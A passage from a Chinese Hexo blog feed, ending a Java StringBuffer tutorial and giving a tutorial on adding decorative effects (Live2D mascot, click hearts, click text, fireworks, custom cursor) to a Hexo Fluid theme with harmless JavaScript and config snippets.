class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.setCharAt(<span class="hljs-keyword">int</span> index, <span class="hljs-keyword">char</span> ch);<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello&quot;</span>);<br>sb.setCharAt(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;E&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：hEllo</span><br>sb.setCharAt(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;H&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：HEllo</span><br>sb.setCharAt(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;p&#x27;</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：HEplo</span><br></code></pre></div></td></tr></table></figure><h4 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h4><p>StringBuffer 类中的 reverse() 方法用于将字符串序列用其反转的形式取代。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.reverse();<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;java&quot;</span>);<br>sb.reverse();<br>System.out.println(sb);    <span class="hljs-comment">// 输出：avaj</span><br></code></pre></div></td></tr></table></figure><h4 id="删除字符串"><a href="#删除字符串" class="headerlink" title="删除字符串"></a>删除字符串</h4><p>StringBuffer 类提供了 deleteCharAt() 和 delete() 两个删除字符串的方法。</p><h5 id="1-deleteCharAt-方法"><a href="#1-deleteCharAt-方法" class="headerlink" title="1.deleteCharAt() 方法"></a>1.deleteCharAt() 方法</h5><p>deleteCharAt() 方法用于移除(删除)序列中指定位置的字符，然后将剩余的内容形成一个新的字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.deleteCharAt(<span class="hljs-keyword">int</span> index);<br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;She&quot;</span>);<br>sb.deleteCharAt(<span class="hljs-number">2</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：Sh</span><br></code></pre></div></td></tr></table></figure><h5 id="2-delete-方法"><a href="#2-delete-方法" class="headerlink" title="2. delete() 方法"></a>2. delete() 方法</h5><p>delete() 方法用于移除序列中子字符串的字符。该方法的作用是删除指定区域以内的所有字符。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StringBuffer 对象.delete(<span class="hljs-keyword">int</span> start,<span class="hljs-keyword">int</span> end);<br><span class="hljs-comment">//start 表示要删除字符的起始索引值（包括索引值所对应的字符），end 表示要删除字符串的结束索引值（不包括索引值所对应的字符）。</span><br><br>StringBuffer sb = <span class="hljs-keyword">new</span> StringBuffer(<span class="hljs-string">&quot;hello jack&quot;</span>);<br>sb.delete(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：he jack</span><br>sb.delete(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>System.out.println(sb);    <span class="hljs-comment">// 输出：heck</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-Fluid主题-页面美化效果实现</title>
    <link href="/2021/04/08/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E9%A1%B5%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%88%E6%9E%9C%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/04/08/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E9%A1%B5%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%88%E6%9E%9C%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>hexo-fluid主题。页面添加动态线条、下雪、代码雨等效果。</p><h2 id="效果目录"><a href="#效果目录" class="headerlink" title="效果目录"></a>效果目录</h2><h3 id="1-添加卡通人物"><a href="#1-添加卡通人物" class="headerlink" title="1.添加卡通人物"></a>1.添加卡通人物</h3><p>项目的地址，<a href="https://github.com/EYHN/hexo-helper-live2d">点击此处进入</a><br>输入如下命令获取</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">$ npm install --save hexo-helper-live2d  <br></code></pre></div></td></tr></table></figure><p>输入以下命令，下载相应的模型，将 packagename 更换成模型名称即可。<a href="https://github.com/xiazeyu/live2d-widget-models">更多模型</a></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">$ npm install packagename<br></code></pre></div></td></tr></table></figure><p>打开站点目录下的 _config.yml 文件，添加如下代码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">live2d:<br><span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>scriptFrom: <span class="hljs-built_in">local</span><br>model: <br>use: live2d-widget-model-haruto <span class="hljs-comment">#模型选择</span><br>display: <br>position: right  <span class="hljs-comment">#模型位置</span><br>width: 150       <span class="hljs-comment">#模型宽度</span><br>height: 300      <span class="hljs-comment">#模型高度</span><br>mobile: <br>show: <span class="hljs-literal">false</span>      <span class="hljs-comment">#是否在手机端显示</span><br></code></pre></div></td></tr></table></figure><p>之后就可以看见卡通人物头像了。</p><hr><h3 id="2-添加鼠标点击爱心效果"><a href="#2-添加鼠标点击爱心效果" class="headerlink" title="2.添加鼠标点击爱心效果"></a>2.添加鼠标点击爱心效果</h3><p>在 \themes\hexo-theme-spfk\source\js （其中hexo-theme-spfk为你主题的文件夹名，即在自己的主题中进行操作）下新建文件 love.js，在 love.js 文件中添加以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">!<span class="hljs-keyword">function</span>(e,t,a)&#123;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">n</span></span>()&#123;c(<span class="hljs-string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),o(),r()&#125;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">r</span></span>()&#123;<span class="hljs-keyword">for</span>(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=<span class="hljs-string">&quot;left:&quot;</span>+d[e].x+<span class="hljs-string">&quot;px;top:&quot;</span>+d[e].y+<span class="hljs-string">&quot;px;opacity:&quot;</span>+d[e].alpha+<span class="hljs-string">&quot;;transform:scale(&quot;</span>+d[e].scale+<span class="hljs-string">&quot;,&quot;</span>+d[e].scale+<span class="hljs-string">&quot;) rotate(45deg);background:&quot;</span>+d[e].color+<span class="hljs-string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">o</span></span>()&#123;var t=<span class="hljs-string">&quot;function&quot;</span>==typeof e.onclick&amp;&amp;e.onclick;e.onclick=<span class="hljs-keyword">function</span>(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="hljs-keyword">function</span> i(e)&#123;var a=t.createElement(<span class="hljs-string">&quot;div&quot;</span>);a.className=<span class="hljs-string">&quot;heart&quot;</span>,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;<span class="hljs-keyword">function</span> c(e)&#123;var a=t.createElement(<span class="hljs-string">&quot;style&quot;</span>);a.type=<span class="hljs-string">&quot;text/css&quot;</span>;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="hljs-string">&quot;head&quot;</span>)[0].appendChild(a)&#125;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">s</span></span>()&#123;<span class="hljs-built_in">return</span><span class="hljs-string">&quot;rgb(&quot;</span>+~~(255*Math.random())+<span class="hljs-string">&quot;,&quot;</span>+~~(255*Math.random())+<span class="hljs-string">&quot;,&quot;</span>+~~(255*Math.random())+<span class="hljs-string">&quot;)&quot;</span>&#125;var d=[];e.requestAnimationFrame=<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<span class="hljs-built_in">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="hljs-keyword">function</span>(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);<br></code></pre></div></td></tr></table></figure><p>在 \themes\hexo-theme-spfk\layout\layout.ejs 文件末尾添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">&lt;!-- 页面点击小红心 --&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/js/love.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>完成后，点击鼠标时就可以看见效果了。</p><h3 id="3-添加鼠标点击显示文字效果"><a href="#3-添加鼠标点击显示文字效果" class="headerlink" title="3.添加鼠标点击显示文字效果"></a>3.添加鼠标点击显示文字效果</h3><p>在 /themes/hexo-theme-spfk/source/js 下新建文件 click_show_text.js，在 click_show_text.js 文件中添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">var a_idx = <span class="hljs-number">0</span>;<br>jQuery(document).ready(function($) &#123;<br>    $(<span class="hljs-string">&quot;body&quot;</span>).click(function(e) &#123;<br>        var a = <span class="hljs-keyword">new</span> Array<br>        (<span class="hljs-string">&quot;富强&quot;</span>, <span class="hljs-string">&quot;民主&quot;</span>, <span class="hljs-string">&quot;文明&quot;</span>, <span class="hljs-string">&quot;和谐&quot;</span>, <span class="hljs-string">&quot;自由&quot;</span>, <span class="hljs-string">&quot;平等&quot;</span>, <span class="hljs-string">&quot;公正&quot;</span>, <span class="hljs-string">&quot;法治&quot;</span>, <span class="hljs-string">&quot;爱国&quot;</span>, <span class="hljs-string">&quot;敬业&quot;</span>, <span class="hljs-string">&quot;诚信&quot;</span>, <span class="hljs-string">&quot;友善&quot;</span>);<br>        var $i = $(<span class="hljs-string">&quot;&lt;span/&gt;&quot;</span>).text(a[a_idx]);<br>        a_idx = (a_idx + <span class="hljs-number">1</span>) % a.length;<br>        var x = e.pageX,<br>        y = e.pageY;<br>        $i.css(&#123;<br>            <span class="hljs-string">&quot;z-index&quot;</span>: <span class="hljs-number">5</span>,<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">20</span>,<br>            <span class="hljs-string">&quot;left&quot;</span>: x,<br>            <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-string">&quot;absolute&quot;</span>,<br>            <span class="hljs-string">&quot;font-weight&quot;</span>: <span class="hljs-string">&quot;bold&quot;</span>,<br>            <span class="hljs-string">&quot;color&quot;</span>: <span class="hljs-string">&quot;#FF0000&quot;</span><br>        &#125;);<br>        $(<span class="hljs-string">&quot;body&quot;</span>).append($i);<br>        $i.animate(&#123;<br>            <span class="hljs-string">&quot;top&quot;</span>: y - <span class="hljs-number">180</span>,<br>            <span class="hljs-string">&quot;opacity&quot;</span>: <span class="hljs-number">0</span><br>        &#125;,<br><span class="hljs-number">3000</span>,<br>function() &#123;<br>    $i.remove();<br>&#125;);<br>    &#125;);<br>    setTimeout(&#x27;delay()&#x27;, 2000);<br>&#125;);<br><br><span class="hljs-function">function <span class="hljs-title">delay</span><span class="hljs-params">()</span> </span>&#123;<br>    $(<span class="hljs-string">&quot;.buryit&quot;</span>).removeAttr(<span class="hljs-string">&quot;onclick&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>文字可以任意替换成自己的。<br>如果想要每次点击显示的文字为不同颜色，可以将其中 color 值进行如下更改：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-string">&quot;color&quot;</span>: <span class="hljs-string">&quot;rgb(&quot;</span> + ~~(<span class="hljs-number">255</span> * Math.random()) + <span class="hljs-string">&quot;,&quot;</span> + ~~(<span class="hljs-number">255</span> * Math.random()) + <span class="hljs-string">&quot;,&quot;</span> + ~~(<span class="hljs-number">255</span> * Math.random()) + <span class="hljs-string">&quot;)&quot;</span><br></code></pre></div></td></tr></table></figure><p>然后在 \themes\hexo-theme-spfk\layout\layout.ejs 文件末尾添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">&lt;!--单击显示文字--&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/js/click_show_text.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>最后就可以看见效果了。</p><h3 id="4-添加鼠标点击烟花爆炸效果"><a href="#4-添加鼠标点击烟花爆炸效果" class="headerlink" title="4.添加鼠标点击烟花爆炸效果"></a>4.添加鼠标点击烟花爆炸效果</h3><p>在 \themes\material-x\source\js 目录下新建一个 fireworks.js 的文件，里面写入以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-string">&quot;use strict&quot;</span>;<span class="hljs-function">function <span class="hljs-title">updateCoords</span><span class="hljs-params">(e)</span></span>&#123;pointerX=(e.clientX||e.touches[<span class="hljs-number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="hljs-number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*Math.PI/<span class="hljs-number">180</span>,a=anime.random(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>][anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;x:e.x+n*Math.<span class="hljs-built_in">cos</span>(t),y:e.y+n*Math.<span class="hljs-built_in">sin</span>(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="hljs-number">0</span>,colors.length<span class="hljs-number">-1</span>)],a.radius=anime.random(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=<span class="hljs-string">&quot;#F00&quot;</span>,a.radius=<span class="hljs-number">0.1</span>,a.alpha=<span class="hljs-number">0.5</span>,a.lineWidth=<span class="hljs-number">6</span>,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="hljs-number">1</span>&#125;,a&#125;function renderParticule(e)&#123;<span class="hljs-keyword">for</span>(var t=<span class="hljs-number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;<span class="hljs-keyword">for</span>(var a=createCircle(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.x&#125;,y:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.y&#125;,radius:<span class="hljs-number">0.1</span>,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),lineWidth:<span class="hljs-number">0</span>,alpha:&#123;value:<span class="hljs-number">0</span>,easing:<span class="hljs-string">&quot;linear&quot;</span>,duration:anime.random(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule,offset:<span class="hljs-number">0</span>&#125;)&#125;function debounce(e,t)&#123;var a;<span class="hljs-keyword">return</span> function()&#123;var n=<span class="hljs-keyword">this</span>,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(function()&#123;canvasEl.width=<span class="hljs-number">2</span>*window.innerWidth,canvasEl.height=<span class="hljs-number">2</span>*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.style.height=window.innerHeight+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>).scale(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=anime(&#123;duration:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,update:function()&#123;ctx.clearRect(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),setCanvasSize(),window.addEventListener(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;<span class="hljs-string">&quot;use strict&quot;</span>;<span class="hljs-function">function <span class="hljs-title">updateCoords</span><span class="hljs-params">(e)</span></span>&#123;pointerX=(e.clientX||e.touches[<span class="hljs-number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="hljs-number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*Math.PI/<span class="hljs-number">180</span>,a=anime.random(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>][anime.random(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;x:e.x+n*Math.<span class="hljs-built_in">cos</span>(t),y:e.y+n*Math.<span class="hljs-built_in">sin</span>(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="hljs-number">0</span>,colors.length<span class="hljs-number">-1</span>)],a.radius=anime.random(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;<span class="hljs-keyword">return</span> a.x=e,a.y=t,a.color=<span class="hljs-string">&quot;#F00&quot;</span>,a.radius=<span class="hljs-number">0.1</span>,a.alpha=<span class="hljs-number">0.5</span>,a.lineWidth=<span class="hljs-number">6</span>,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*Math.PI,!<span class="hljs-number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="hljs-number">1</span>&#125;,a&#125;function renderParticule(e)&#123;<span class="hljs-keyword">for</span>(var t=<span class="hljs-number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;<span class="hljs-keyword">for</span>(var a=createCircle(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.x&#125;,y:function(e)&#123;<span class="hljs-keyword">return</span> e.endPos.y&#125;,radius:<span class="hljs-number">0.1</span>,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),lineWidth:<span class="hljs-number">0</span>,alpha:&#123;value:<span class="hljs-number">0</span>,easing:<span class="hljs-string">&quot;linear&quot;</span>,duration:anime.random(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,duration:anime.random(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),easing:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,update:renderParticule,offset:<span class="hljs-number">0</span>&#125;)&#125;function debounce(e,t)&#123;var a;<span class="hljs-keyword">return</span> function()&#123;var n=<span class="hljs-keyword">this</span>,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(function()&#123;canvasEl.width=<span class="hljs-number">2</span>*window.innerWidth,canvasEl.height=<span class="hljs-number">2</span>*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.style.height=window.innerHeight+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.getContext(<span class="hljs-string">&quot;2d&quot;</span>).scale(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=anime(&#123;duration:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,update:function()&#123;ctx.clearRect(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),setCanvasSize(),window.addEventListener(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;;<br></code></pre></div></td></tr></table></figure><p>然后在 \themes\material-x\layout\layout.ejs 文件中写入以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">&lt;canvas <span class="hljs-class"><span class="hljs-keyword">class</span>=</span><span class="hljs-string">&quot;fireworks&quot;</span> style=<span class="hljs-string">&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;</span> &gt;&lt;/canvas&gt; <br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;</span>&gt;&lt;/script&gt; <br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;/js/fireworks.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>完成后，点击鼠标时就可以看见爆炸效果了。</p><h3 id="5-自定义鼠标指针样式"><a href="#5-自定义鼠标指针样式" class="headerlink" title="5.自定义鼠标指针样式"></a>5.自定义鼠标指针样式</h3><p>在 \themes\material-x\source\less_base.less 文件 body 样式里写入如下代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">body &#123;<br>    cursor: url(https:<span class="hljs-comment">//cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@2.1.6/images/mouse.cur),auto;</span><br>    background-color: @theme_background;<br>    ......<br>    ......<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>鼠标指针可以用 Axialis CursorWorkshop 